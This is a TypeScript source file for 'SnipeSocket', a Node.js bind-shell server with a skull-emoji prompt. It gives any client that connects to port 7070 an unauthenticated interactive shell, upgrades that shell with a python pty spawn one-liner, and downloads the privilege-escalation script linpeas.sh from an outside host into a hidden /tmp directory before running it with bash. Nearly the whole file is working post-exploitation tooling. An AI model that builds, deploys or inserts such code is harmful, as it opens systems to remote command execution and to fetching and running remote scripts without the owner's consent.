// Imports
import colors from 'colors/safe';
import { spawn, execSync, spawnSync, SpawnOptionsWithoutStdio, ChildProcessWithoutNullStreams } from 'child_process';
import os from 'os';
import fs from 'fs';
import net from 'net';
import path from 'path';
import http from 'http';
import https from 'https';
import tty, { ReadStream, WriteStream } from 'tty';
import stream, { Duplex, Readable, Writable } from 'stream';

const LOAD_MAP = {
  linpeas: 'linpeas.sh'
};

const WEB_HOST = 'https://f11snipe.sh/sh';
const UNIX_SHELLS = ['bash', 'sh'];
const UNIX_DEFAULT = 'bin/sh';
const TMP_DIR = `/tmp/.f11`;
const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];

colors.setTheme({
  ok: ['green'],
  good: ['green'],
  warn: ['yellow'],
  info: ['black', 'bgCyan'],
  debug: ['dim', 'cyan', 'italic'],
  error: ['red', 'underline'],
  module: ['red', 'bold', 'italic'],
  fatal: ['white', 'bgRed', 'bold'],
  prompt: ['trap', 'blue', 'bold'],
  pending: ['trap', 'blue', 'bold', 'strikethrough']
});

// Constants
const DEFAULT_PROMPT = colors.reset('💀 ') + colors['prompt']('f11>') + colors.reset(' ');
let PROMPT = DEFAULT_PROMPT;
const NEWLINE = `\r\n`;
const PORT = 7070;
const HOST = '0.0.0.0';
const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
// Create net tcp server
const server = net.createServer();
// Define empty array of SnipeSocket[] to track open connections
const sockets: SnipeSocket[] = [];
const timestamp = (): string => new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

type msgType = 'ok' | 'good' | 'warn' | 'info' | 'debug' | 'error' | 'fatal';

const log = (...args) => console.log( colors.gray(timestamp()), ...args);
const msg = (theme: msgType, body: string, plain?: string) => {
  log(colors[theme](body));
  if (plain) log(plain);
};
const isMac = (): boolean => /darwin/i.test(os.platform());
const isLinux = (): boolean => /linux/i.test(os.platform());
const isWindows = (): boolean => /win/i.test(os.platform());
const isNotWindows = (): boolean => !isWindows();
const findWinShell = (): string => 'cmd.exe'; // LOL F*#K WINDOWS
const findNixShell = (): string => {
  for (let i = 0; i <  UNIX_SHELLS.length; i++) {
    const shell = UNIX_SHELLS[i];
    const check = spawnSync('which', [shell]);

    if (check.status === 0) {
      const found = check.stdout.toString().trim();
      msg('debug', `Using shell: '${shell}' -> ${found}`);
      return found;
    } else {
      msg('warn', `Unable to find shell: '${shell}'`);

      if (i < UNIX_SHELLS.length - 1) {
        msg('debug', `Trying next shell: ${UNIX_DEFAULT[i+1]} ...`);
      }
    }
  }

  // Return default shell "bin/sh"
  return UNIX_DEFAULT;
}

const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();

class SnipeSocket {
  public sock: net.Socket;
  public cp: ChildProcessWithoutNullStreams;
  public inShell = false;
  public inSpawn = false;
  public loaded?: any;

  constructor (socket: net.Socket, args: string[] = [], opts?: SpawnOptionsWithoutStdio) {
    this.sock = socket;
    this.sock.on('data', this.onData.bind(this));

    if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });

    const events = ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'ready', 'timeout'];

    events.forEach((e, i) => {
      this.sock.on(e, (...args) => {
        msg('debug', `[${i}] sock.on(${e}): ${JSON.stringify(args)}`);
      });
    })
  }

  public onData (data) {
    msg('debug', `SnipeSocket.onData: ${data}`);

    if (this.cp && this.inShell) {
      this.command(data);
    } else {
      this.handle(data);
    }
  };

  public get sig(): string {
    return `${this.sock.remoteAddress}:${this.sock.remotePort}`
  }

  public reset(): void {
    PROMPT = DEFAULT_PROMPT;
    this.loaded = undefined;
    this.inShell = false;
    this.cleanup();
    this.prompt();
  }

  public command(data: any, cb?: (code: number|null) => void): void {
    if (this.inShell) {
      if (this.cp && this.cp.stdin) {
        const cmd = data.toString().trim();

        if (/^(exit|quit)$/i.test(cmd)) {
          this.reset();
        } else {
          msg('debug', `Send spawn command: ${data}`);
          this.cp.stdin.write(data);
        }
      } else {
        msg('warn', `Unable to send cmd (missing cp or cp.stdin): ${data}`);
      }
    } msg('debug', `Not sending command (not inShell): ${data}`);
  }

  public load(target: string, cb?: (code: number|null) => void): void {
    if (this.loaded && this.loaded.target === target) {
      if (cb) cb(0);
      return;
    }

    if (!LOAD_MAP[target]) {
      this.sock.write(colors['warn'](`Missing/unknown module: ${target}`));
      this.prompt();
      if (cb) cb(1);
      return;
    }

    const file = LOAD_MAP[target];
    const out = `${TMP_DIR}/${file}`;
    const url = `${WEB_HOST}/${file}`;
    const dir = path.dirname(out);

    if (!fs.existsSync(dir)) fs.mkdirSync(dir);

    msg('debug', `Fetching remote file: ${file} (${url} -> ${out})`);

    this.download(out, url, (err) => {
      if (err) msg('error', err.message);
      msg('debug', 'Download Completed');

      if (!this.loaded) {
        this.loaded = {
          target,
          file,
          out,
          url,
          dir,
          err
        };
        PROMPT = colors['rainbow'](this.loaded.target) + colors.reset(' | ') + PROMPT;
      }

      this.sock.write(NEWLINE);
      this.sock.write(colors.green(`Loaded: ${target}`));
      this.sock.write(NEWLINE);
      // this.sock.write(colors.yellow(`Executing: ${out}`));
      // this.sock.write(NEWLINE);

      this.prompt();
      // execSync(`chmod +x ${out}`);
      // this.run(out, cb);

      // this.spawn('bash', [out], { shell: true, detached: true }, (code) => {
      //   this.prompt();
      //   if (cb) cb(code);
      // });
    });
  }

  public run(file, cb?: (code: number|null) => void) {
    this.load(file, (code) => {
      msg('debug', `Calling run, after load with code: ${code}`);

      this.spawn('bash', [file], { shell: true, detached: true }, (code) => {
        this.prompt();
        if (cb) cb(code);
      });
    });
  }

  public download(file, url, cb?: (err?: Error) => void): http.ClientRequest {
    let localFile = fs.createWriteStream(file);

    return https.get(url, (response) => {
      const rep = response.headers['content-length'];
      var len = rep ? parseInt(rep, 10) : 0;
      var cur = 0;
      var total = len / 1048576; //1048576 - bytes in 1 Megabyte

      response.on('data', (chunk) => {
        cur += chunk.length;
        this.progress(`Download: ${path.basename(file)}`, cur, len, total);
      });

      response.on('end', () => {
        msg('debug', 'Download complete');
        if (cb) cb();
      });

      response.pipe(localFile);
    }).on('error', (err) => {
      fs.unlinkSync(file);
      if (cb) cb(err);
    });;
  }

  public progress(msg, cur, max, total) {
    const stamp = colors.yellow(`${msg} - ${(100.0 * cur / max).toFixed(2)}% (${(cur / 1048576).toFixed(2)} MB) of total size: ${total.toFixed(2)} MB`);
    this.sock.write(`\r${stamp}`);
    // console.log(`\r${stamp}`);
  }

  public prompt(): void {
    // this.cp?.stdin?.write(' ');
    this.sock.write(`${NEWLINE}${PROMPT}`);
  }

  public welcome(isNexe = false): void {
    let banner = 'msgs/welcome.txt';
    let body = 'Welcome to SnipeSocket!';

    try {
      if (isNexe) {
        body = colors.blue(require('nexeres').get(banner));
        body += colors.blue(require('nexeres').get('msgs/derp-60.txt'));
      } else if (fs.existsSync(banner)) {
        body = colors.blue(fs.readFileSync(banner).toString());
      } else {
        body = `[fallback] ${body}`
      }
    } catch (err) {
      msg('warn', `Caught error reading msg text files, falling back`);
      console.log(err);
      this.sock.write('Welcome!');
    }

    this.sock.write(body);

    this.prompt();
  }

  public spawn(cmd: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
    const defaults: SpawnOptionsWithoutStdio = {
      cwd: '/tmp',
      env: process.env
    };

    this.cp = spawn(cmd, args, { ...defaults, ...args });

    this.cp.stdout.on('data', (data) => {
      msg('debug', `SnipeSocket.cp.stdout: ${data}`);
      this.sock.write(data);
    });

    this.cp.stderr.on('data', (data) => {
      msg('debug', `SnipeSocket.cp.stderr: ${data}`);
      this.sock.write(data);
    });

    this.cp.on('close', (code) => {
      msg('debug', `[spawn] Child process exited with code ${code}`);
      this.cleanup();
      if (cb) cb(code);
    });
  }

  public shell(cmd?: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
    const target = cmd || findShell();
    this.inShell = true;

    this.spawn(target, args, opts, (code) => {
      this.inShell = false;
      if (cb) cb(code);
    });

    this.command(`${STABALIZE}\r\n`);
  }

  public cleanup(): void {
    this.cp?.removeAllListeners();
  }

  public handle(data: Buffer) {
    msg('info', `Handle socket data: ${data}`);

    const args = data.toString().trim().split(' ').map(p => p.trim());

    if (!args.length) {
      this.prompt();
      return;
    }

    const cmd = args.shift() as string;

    if (this.inShell) return;

    if (this.loaded) {
      if (/^run$/i.test(cmd)) {
        this.run(this.loaded.out);
      } else if (/^stop$/i.test(cmd)) {
        this.cp?.kill();
        this.reset();
      }
    } else if (/^shell$/i.test(cmd)) {
      this.shell();
    } else if (Object.keys(LOAD_MAP).includes(cmd)) {
      this.load(cmd);
    } else if (/^load/i.test(cmd)) {
      if (!args[0]) {
        this.sock.write(colors.red(`Missing module: "load <module>"`));
        this.prompt();
      } else {
        this.load(args[0]);
      }
    } else if (/^show/i.test(cmd)) {
      this.sock.write(colors.cyan(`Available modules:\r\n`));
      Object.keys(LOAD_MAP).forEach(mod => {
        const map = LOAD_MAP[mod];
        this.sock.write(colors.reset(`\t☠️ `) + colors.cyan(`'${mod}' => ${map}`));
      });
      this.prompt();
    } else {
      this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
      this.prompt();
    }
  }
}

// Intialize and listen for connections
server.listen(PORT, HOST, () => {
  msg('good', `F11snipe Server Started!`);
  msg('good', `Listening: ${HOST}:${PORT}`);
  msg('good', `SHELL: ${findShell()}`)
});

// Main handler for new connections
server.on('connection', (sock: net.Socket) => {
  const socket = new SnipeSocket(sock);
  sockets.push(socket);

  msg('info', `[${socket.sig}] New Connection`);

  try {
    socket.welcome();

    socket.sock.on('close', (hadError: boolean) => {
      if (hadError) log(`Socket.on(close) with error!`);
      let idx = sockets.findIndex((sock) => sock.sig === socket.sig);
      if (idx >= 0) {
        sockets.splice(idx, 1);
      }

      msg('info', `[${socket.sig}] Closed Connection`);
    });
  } catch (err: any) {
    msg('fatal', `Caught connection error: ${err.message}`);
  }
});
